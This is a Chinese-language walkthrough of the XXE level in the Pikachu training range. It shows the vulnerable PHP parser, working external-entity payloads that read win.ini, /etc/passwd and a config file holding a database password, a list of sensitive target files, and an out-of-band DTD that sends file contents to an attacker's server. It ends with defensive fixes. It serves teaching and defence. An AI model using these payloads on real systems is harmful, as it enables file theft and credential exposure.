# XXE漏洞 通关笔记

> 菜单里叫 **XXE漏洞**。
>
> 页面说「这是一个接收 xml 数据的 api」。
>
> 那就在 XML 里加一个"外部实体"，让它去读服务器上的文件。

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | XXE → XXE漏洞 |
| 页面地址 | `http://pikachu/vul/xxe/xxe_1.php` |
| 提交方式 | POST |
| 参数名 | `xml` |
| 目标 | 读取服务器上的任意文件 |

---

## 二、我的解题步骤

### 步骤 1：先提交一个正常的 XML

```
<?xml version="1.0"?><name>pikachu</name>
```

页面输出：

```
pikachu
```

**说明服务端真的在解析 XML。**

### 步骤 2：看源码

```php
//考虑到目前很多版本里面libxml的版本都>=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析
if(isset($_POST['submit']) and $_POST['xml'] != null){
    $xml =$_POST['xml'];
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    if($data){
        $html.="<pre>{$data}</pre>";
    }else{
        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
}
```

**关键在 `LIBXML_NOENT`——它开启了外部实体解析。**

作者还贴心地注释了 payload（第 19-25 行）：

```php
$xxepayload1 = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
EOF;
```

### 步骤 3：Windows 上要换路径

Pikachu 跑在 Windows，`/etc/passwd` 不存在。

换成：

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///C:/Windows/win.ini">
]>
<x>&f;</x>
```

> 注意：Windows 路径用 `file:///C:/...`，**三个斜杠**。

### 步骤 4：提交，看结果

我实测的输出：

```
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

**`win.ini` 的内容被读出来了。**

### 步骤 5：换成更敏感的文件

```xml
<!ENTITY f SYSTEM "file:///D:/Pikachu/inc/config.inc.php">
```

但 PHP 文件会被当文本读——**内容是源码**：

```php
define('DBPW', 'rootroot');
```

**数据库密码泄露。**

---

## 三、原理分析

### 3.1 完整链路

```
攻击者提交 XML
        ↓
simplexml_load_string($xml, ..., LIBXML_NOENT)
        ↓
解析 DTD，发现 <!ENTITY f SYSTEM "file:///...">
        ↓
去读那个文件
        ↓
&f; 被替换成文件内容
        ↓
<pre>{$data}</pre> 输出
```

### 3.2 为什么 `LIBXML_NOENT` 是关键

| 配置 | 外部实体 | 能否 XXE |
| --- | --- | --- |
| 默认（libxml ≥ 2.9） | 不解析 | ❌ |
| `LIBXML_NOENT` | **解析** | ✅ |
| `libxml_disable_entity_loader(true)` | 强制关闭 | ❌ |

**这个参数的名字容易误解：`NOENT` 不是"禁止实体"，是"替换实体"（substitute entities）。**

### 3.3 `file:///` 三个斜杠的原因

```
file:///C:/Windows/win.ini
```

| 部分 | 含义 |
| --- | --- |
| `file://` | 协议 |
| `/`（第三个斜杠） | 路径的根 |
| `C:/Windows/win.ini` | 文件路径 |

- **`file://C:/...` 会被解析成"主机名 `C:`"** —— 少一个斜杠就读不到
- Windows 路径本身带冒号，必须用 `file:///` 开头

### 3.4 能读什么、不能读什么

| 文件 | 能否读 |
| --- | --- |
| `.txt` / `.ini` | ✅ |
| `.php`（源码） | ✅（当文本读） |
| 二进制文件 | ⚠️ 会乱码，可能读不全 |
| 需要权限的文件 | ❌ |

**PHP 源码会被当纯文本输出——这比执行更有价值（能看到密码）。**

---

## 四、知识点与笔记

### 4.1 标准 payload

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>
```

### 4.2 常用目标文件

| 系统 | 文件 |
| --- | --- |
| Linux | `/etc/passwd`、`/etc/shadow`、`/proc/self/environ` |
| Windows | `C:/Windows/win.ini`、`C:/boot.ini` |
| 代码 | `config.php`、`.env`、`web.config` |

### 4.3 没有回显怎么办

如果页面不显示解析结果，用 **带外（OOB）**：

```xml
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % dtd SYSTEM "http://你的服务器/evil.dtd">
%dtd;
```

`evil.dtd`：

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://你的服务器/?c=%file;'>">
%all;
```

**服务器会主动把文件内容发到你的服务器。**

### 4.4 常见变形

| 变形 | 说明 |
| --- | --- |
| 参数实体 `%name;` | DTD 内部用 `%`，文档内用 `&` |
| 多段拼接 | 分段读大文件 |
| UTF-16 编码 | 绕过某些 WAF |
| SVG 上传 | 把 XML 塞进图片 |

### 4.5 为什么这一关"能直接看到"

```php
$html.="<pre>{$data}</pre>";
```

**`$data` 是 `SimpleXMLElement` 对象，转成字符串就是它的文本内容。**

所以 `<x>&f;</x>` 解析后，`$data` 的字符串形式就是文件内容。

---

## 五、和其他几关的区别

| 关卡 | 读文件的方式 |
| --- | --- |
| **XXE** | XML 实体 |
| 文件下载 | `readfile` |
| 文件包含 | `include`（会执行） |
| SSRF | `curl` / `file_get_contents` |

**四种姿势，同一个目标：让服务器替我们读文件。**

---

## 六、防御怎么写

### 6.1 不要加 `LIBXML_NOENT`

```php
// 危险
simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);

// 安全：用默认参数
simplexml_load_string($xml);
```

### 6.2 PHP 7 及以前：显式禁用

```php
libxml_disable_entity_loader(true);
$data = simplexml_load_string($xml);
```

### 6.3 用 `LIBXML_NONET`

```php
simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET);
```

**禁止访问网络，能挡住 OOB 和 SSRF 型 XXE。**

### 6.4 拒绝 DTD

```php
if (stripos($xml, '<!DOCTYPE') !== false || stripos($xml, '<!ENTITY') !== false) {
    exit('不允许 DTD');
}
```

**黑名单能挡一部分，但不是根治。**

### 6.5 根治：不用 XML

**能用 JSON 就用 JSON。** `json_decode` 没有实体、没有 DTD，天然安全。

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | XXE 读任意文件 |
| 关键配置 | `LIBXML_NOENT` |
| payload | `<!ENTITY f SYSTEM "file:///C:/Windows/win.ini">` |
| 实测 | 读到 `win.ini` 内容 |
| 修复 | 不加 NOENT / 禁用实体 |

**一句话**：

> **XML 的实体能指向文件——解析器一"展开"，文件就出来了。**

---

## 参考

- [OWASP: XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PHP: libxml 常量](https://www.php.net/manual/zh/libxml.constants.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
